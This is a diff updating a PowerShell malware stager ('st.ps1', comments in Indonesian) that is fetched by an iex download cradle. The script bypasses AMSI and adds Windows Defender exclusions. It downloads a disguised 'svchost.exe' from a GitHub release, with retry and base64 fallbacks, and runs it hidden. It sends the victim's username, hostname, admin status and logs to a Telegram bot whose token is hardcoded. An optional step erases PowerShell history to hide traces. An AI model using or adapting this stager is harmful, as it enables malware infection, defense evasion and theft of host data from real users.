@@ -1,69 +1,108 @@
-# st.ps1 v2 - stager + cleanup + bukti via Telegram
+# st.ps1 v3 - stager + retry + bukti via Telegram
 # Dipanggil cradle:  iex (WebClient).DownloadString('https://.../st.ps1')
 
-$ErrorActionPreference = 'SilentlyContinue'
+$ErrorActionPreference = 'Continue'
 $ProgressPreference    = 'SilentlyContinue'
 
 # ---------------------------------------------------------------- CONFIG
-$url     = 'https://github.com/byteforge0-cloud/darkwhisper/releases/download/mantap/svchost.exetTy'
-$exe     = Join-Path $env:TEMP 'svchosts.exe'
-$bot     = ''                       # token bot, kosongkan kalau tak perlu
-$chat    = ''                       # chat_id tujuan
-$cleanup = $true                    # TRUE = hapus exclusion + jejak setelah jalan
+$url     = 'https://github.com/byteforge0-cloud/darkwhisper/releases/download/mantap/svchost.exe'
+$urlB64  = ''                       # opsional: URL .b64 (base64 exe) sbg cadangan
+$exe     = Join-Path $env:TEMP ('svchost_{0}.exe' -f (Get-Random -Minimum 10000 -Maximum 99999))
+$bot     = '9037027380:AAFrvv-oDxBH65pNbv0aNAflsjMAijyDMKo'
+$chat    = '949121454'
+$cleanup = $false
+$ua      = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
 # ----------------------------------------------------------------------
 
-function T($s) { $s | Out-File -FilePath (Join-Path $env:TEMP 'st.txt') -Append -Encoding utf8 }
+$log  = Join-Path $env:TEMP 'st.txt'
+$mark = Join-Path $env:TEMP 'st.marker'
+function T($s) { "$((Get-Date -f HH:mm:ss))  $s" | Out-File -FilePath $log -Append -Encoding utf8 }
+
+# penjaga: jangan eksekusi ulang dalam 5 menit
+if ((Test-Path $mark) -and ((Get-Date) - (Get-Item $mark).LastWriteTime).TotalMinutes -lt 5) { exit }
+New-Item $mark -ItemType File -Force | Out-Null
+Remove-Item $log -Force -ErrorAction SilentlyContinue
+
+T "start pid=$PID ps=$($PSVersionTable.PSVersion) x86=$([Environment]::Is64BitProcess)"
+T "admin=$(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole('Administrators'))"
 
 # ---------- 0. AMSI ------------------------------------------------------
 try {
     $t = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
     $t.GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
-} catch { }
+    T 'amsi ok'
+} catch { T 'amsi fail' }
 
-# ---------- 1. exclusion SEBELUM unduhan (kunci: jangan sesudah) ---------
-Add-MpPreference -ExclusionPath $exe -Force
-Add-MpPreference -ExclusionProcess 'svchosts.exe' -Force
-Add-MpPreference -ExclusionPath $env:TEMP -Force
-T 'excl ok'
+# ---------- 1. exclusion ------------------------------------------------
+$ok = 0
+try { Add-MpPreference -ExclusionPath $exe -Force -ErrorAction Stop; $ok++ } catch { }
+try { Add-MpPreference -ExclusionProcess 'svchost*.exe' -Force -ErrorAction Stop; $ok++ } catch { }
+try { Add-MpPreference -ExclusionPath $env:TEMP -Force -ErrorAction Stop; $ok++ } catch { }
+T "excl=$ok/3"
 
-# ---------- 2. unduh: curl dulu, WebClient cadangan ---------------------
-Remove-Item $exe -Force
-curl.exe -sL --max-time 600 -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' -o $exe $url
+# ---------- 2. unduh: 3x coba, lalu base64 ------------------------------
+Remove-Item $exe -Force -ErrorAction SilentlyContinue
+for ($i = 1; $i -le 3; $i++) {
+    curl.exe -sL --max-time 600 -A $ua -o $exe $url
+    if ((Test-Path $exe) -and (Get-Item $exe).Length -gt 1MB) { T "curl ok try=$i"; break }
+    T "curl gagal try=$i"
+    Start-Sleep -Seconds 2
+}
+
 if (-not (Test-Path $exe) -or (Get-Item $exe).Length -lt 1MB) {
     try {
         $c = New-Object Net.WebClient
-        $c.Headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
+        $c.Headers['User-Agent'] = $ua
         $c.DownloadFile($url, $exe)
-    } catch { T 'dl fail' }
+        T 'webclient ok'
+    } catch { T "webclient fail: $($_.Exception.Message)" }
 }
-if (-not (Test-Path $exe) -or (Get-Item $exe).Length -lt 1MB) { T 'abort'; return }
-Unblock-File $exe
 
-# ---------- 3. jalan ----------------------------------------------------
-Start-Process -FilePath $exe -WindowStyle Hidden
+if ($urlB64 -and (-not (Test-Path $exe) -or (Get-Item $exe).Length -lt 1MB)) {
+    try {
+        $c = New-Object Net.WebClient
+        $b = ($c.DownloadString($urlB64)) -replace '\s', ''
+        [IO.File]::WriteAllBytes($exe, [Convert]::FromBase64String($b))
+        T 'b64 ok'
+    } catch { T "b64 fail: $($_.Exception.Message)" }
+}
 
-# ---------- 4. bukti: kirim identitas + status AV ke Telegram -----------
-if ($bot -and $chat) {
-    $proof = Join-Path $env:TEMP ('p_{0}.txt' -f (Get-Random))
-    @(
-        "user : $env:USERNAME"
-        "host : $env:COMPUTERNAME"
-        "admin: $(([Security.Principal.WindowsIdentity]::GetCurrent()).Name)"
-        "av   : $((Get-MpComputerStatus).RealTimeProtectionEnabled)"
-        "time : $(Get-Date -f s)"
-    ) | Out-File $proof -Encoding utf8
-    $api = "https://api.telegram.org/bot$bot/sendDocument"
-    curl.exe -s -F "chat_id=$chat" -F "document=@$proof" -F "caption=$env:COMPUTERNAME" $api > $null
-    Remove-Item $proof -Force
+if (-not (Test-Path $exe)) { T 'ABORT tidak ada file'; }
+elseif ((Get-Item $exe).Length -lt 1MB) { T "ABORT ukuran $((Get-Item $exe).Length)" }
+else {
+    T "ukuran $((Get-Item $exe).Length)"
+    Unblock-File $exe -ErrorAction SilentlyContinue
+
+    # ---------- 3. jalan ------------------------------------------------
+    Start-Process -FilePath $exe -WindowStyle Hidden
+    T 'started'
+
+    # ---------- 4. bukti -----------------------------------------------
+    if ($bot -and $chat) {
+        $proof = Join-Path $env:TEMP ('p_{0}.txt' -f (Get-Random))
+        @(
+            "user : $env:USERNAME"
+            "host : $env:COMPUTERNAME"
+            "admin: $(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole('Administrators'))"
+            "time : $(Get-Date -f s)"
+        ) | Out-File $proof -Encoding utf8
+        $api = "https://api.telegram.org/bot$bot/sendDocument"
+        curl.exe -s -F "chat_id=$chat" -F "document=@$proof" -F "caption=$env:COMPUTERNAME" $api > $null
+        curl.exe -s -F "chat_id=$chat" -F "document=@$log" -F "caption=log" $api > $null
+        if (Test-Path (Join-Path $env:TEMP 'b.txt')) {
+            curl.exe -s -F "chat_id=$chat" -F "document=@$(Join-Path $env:TEMP 'b.txt')" -F "caption=av" $api > $null
+        }
+        Remove-Item $proof -Force -ErrorAction SilentlyContinue
+    }
 }
 
 # ---------- 5. cleanup --------------------------------------------------
 if ($cleanup) {
-    # path exclusion dibuang, exclusion proses dibiarkan: exe masih hidup
-    Remove-MpPreference -ExclusionPath $exe -Force
-    Remove-MpPreference -ExclusionPath $env:TEMP -Force
+    Remove-MpPreference -ExclusionPath $exe -Force -ErrorAction SilentlyContinue
+    Remove-MpPreference -ExclusionPath $env:TEMP -Force -ErrorAction SilentlyContinue
     Clear-History
-    Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
-    Remove-Item (Join-Path $env:TEMP 'st.txt') -Force
+    Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
+    Remove-Item $log -Force -ErrorAction SilentlyContinue
+    Remove-Item $mark -Force -ErrorAction SilentlyContinue
 }
 exit
